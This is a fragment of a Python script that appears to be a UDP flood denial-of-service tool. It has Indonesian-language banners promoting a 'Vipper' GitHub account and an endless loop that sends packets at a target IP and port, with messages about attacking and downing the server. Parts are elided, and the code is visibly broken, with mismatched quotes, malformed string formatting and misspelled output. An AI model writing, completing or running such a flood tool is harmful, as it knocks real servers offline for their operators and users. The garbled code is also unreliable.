...
print("\033[1;33;40m Jangan Lupa Follo Github Fantastic Vipper Agar Lu Tau Kapan Updatenya\n")
print("\033[1;32;40m 
██╗░░░██╗██╗██████╗░██████╗░███████╗██████╗░
██║░░░██║██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
╚██╗░██╔╝██║██████╔╝██████╔╝█████╗░░██████╔╝
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[1;32;40m Send Pakcet To Ip % And Attack Port % ((ip,port)")")
		except:
			s.close()
			print("[!] The Server Has Dint Respond Downed")
